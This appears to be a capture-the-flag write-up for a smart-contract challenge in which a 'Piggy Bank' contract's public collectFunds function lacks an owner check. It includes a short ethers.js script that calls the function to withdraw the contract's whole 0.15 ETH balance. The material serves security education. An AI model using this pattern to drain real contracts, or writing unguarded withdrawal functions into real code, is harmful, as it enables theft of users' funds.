# Piggy Bank

# Problem Statement
```
Welcome to the Piggy Bank Contract
This contract belongs to Charlie with the address CHARLIES_ADDRESS
Charlie is the only person capable of withdrawing from this contract
Your wallet is YOUR_ADDRESS, so you are not Charlie and you can not withdraw

Piggy Bank Details
Balance: 0.15 ETH
Total Withdrawls: 0
I'm definitely Charlie! Let me withdraw!
```

# Solution
Lets first look at all the `public`/`external` methods we can call. After looking at all all of these externally callable functions, we see a way to withdraw funds by looking at the `CharliesPiggyBank` contract's `collectFunds` function:
```
function collectFunds(uint256 amount) public ctf{
    require(amount<=piggyBalance, "Insufficient Funds in Contract");
    withdrawlCount = withdrawlCount.add(1);
    withdraw(amount);
}
```
It calls the `withdraw` method to withdraw the funds. It is also `public` so it is available to call by anyone and all it checks for is if the input `amount` is less than or equal to the ether balance of the contract.<br>
Great. So all we have to do is to call this function with the total ether amount of the contract:
```
// using ethers.js
const contractAddress = // PiggyBank contract address
const eoa = // Your address
const abi = [
  {
    constant: false,
    inputs: [{ name: "amount", type: "uint256" }],
    name: "collectFunds",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
];
const contract = new ethers.Contract(contractAddress, abi, eoa);
const weiAmount = ethers.utils.parseUnits(".15", "ether"); // .15 ethers is in the contract
const tx = await contract.collectFunds(weiAmount);
```

We've completed this lesson!

# Key Learnings
- Always poke around in a contract to see the available holes available to test. These are the `public`/`external` functions.
